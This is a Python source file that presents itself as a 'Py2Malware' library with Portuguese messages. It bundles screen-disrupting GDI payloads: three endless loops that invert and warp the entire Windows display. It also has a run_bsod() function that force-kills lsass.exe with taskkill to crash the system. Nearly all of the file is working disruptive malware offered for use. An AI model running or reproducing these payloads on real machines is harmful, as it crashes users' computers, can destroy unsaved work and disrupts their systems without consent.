import ctypes
import win32gui
import math
import time
import win32con
import multiprocessing

info = """
(Todos os comandos de gdi não acabam com o computador, por isso podem ser usados livremente)
COMANDOS DA BIBLIOTECA Py2Malware by magyn:
- run_gdi1()
- stop_gdi1()
- run_gdi2()
- stop_gdi1()
- run_gdi3()
- stop_gdi3()
- run_info()
- run_bsod()
- sleep(timehere)"""

def run_info():
    print(info)

gdi1 = """import win32gui
import ctypes
hdc = win32gui.GetDC(0)
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
while True:
    win32gui.InvertRect(hdc, (0, 0, w ,h))
"""

def run_gdi1_process():
    try:
        exec(gdi1)
    except Exception as e:
        print(f"Erro na execução do gdi1: {e}")

gdi2 = """import ctypes
import win32gui
import math
import time

user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
hdc = win32gui.GetDC(0)

# Constants
NOTSRCCOPY = 0x00330008
SRCAND = 0x008800C6

dx1, dy1 = -3, -3
dx2, dy2 = 1, 1
angle = 0
size = 1
speed = 5

try:
    while True:
        win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx1, dy1, NOTSRCCOPY)  # First action
        win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx2, dy2, SRCAND)      # Second action

        dx1 = math.ceil(math.sin(angle) * size * 10)
        dy1 = math.ceil(math.cos(angle) * size * 10)
        dx2 = math.ceil(math.sin(angle) * size * -10)
        dy2 = math.ceil(math.cos(angle) * size * -10)
        angle += speed / 10.0

        if angle > math.pi:
            angle = math.pi * -1

        time.sleep(0.01)  # Add a small delay to prevent high CPU usage

finally:
    win32gui.ReleaseDC(0, hdc)
"""

def run_gdi2_process():
    try:
        exec(gdi2)
    except Exception as e:
        print(f"Erro na execução do gdi2: {e}")

gdi3 = """import win32gui
import win32con
import ctypes

user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
hdc = win32gui.GetDC(0)

while True:
    
    win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, -3,-3, win32con.NOTSRCCOPY)"""

def run_gdi3_process():
    try:
        exec(gdi3)
    except Exception as e:
        print(f"Erro na execução do gdi3: {e}")

bsod = """import subprocess

def encerrar_processo(nome):
    try:
        subprocess.run(['taskkill', '/f', '/im', nome], check=True)
        print(f"Processo {nome} encerrado")
    except subprocess.CalledProcessError as e:
        print(f"Erro {nome}: {e}")

process = 'lsass.exe'
encerrar_processo(process)"""

def run_bsod_process():
    try:
        exec(bsod)
    except Exception as e:
        print(f"Erro na execução do bsod: {e}")

def stop_gdi1():
    global gdi1_process
    try:
        gdi1_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o gdi1: {e}")

def run_gdi1():
    global gdi1_process
    gdi1_process = multiprocessing.Process(target=run_gdi1_process)
    gdi1_process.start()

def stop_gdi2():
    global gdi2_process
    try:
        gdi2_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o gdi2: {e}")

def run_gdi2():
    global gdi2_process
    gdi2_process = multiprocessing.Process(target=run_gdi2_process)
    gdi2_process.start()

def stop_gdi3():
    global gdi3_process
    try:
        gdi3_process.terminate()
    except Exception as e:
        print(f"Erro ao parar o gdi3: {e}")

def run_gdi3():
    global gdi3_process
    gdi3_process = multiprocessing.Process(target=run_gdi3_process)
    gdi3_process.start()

def run_bsod():
    bsod_process = multiprocessing.Process(target=run_bsod_process)
    bsod_process.start()

def sleep(tempo):
    time.sleep(tempo)

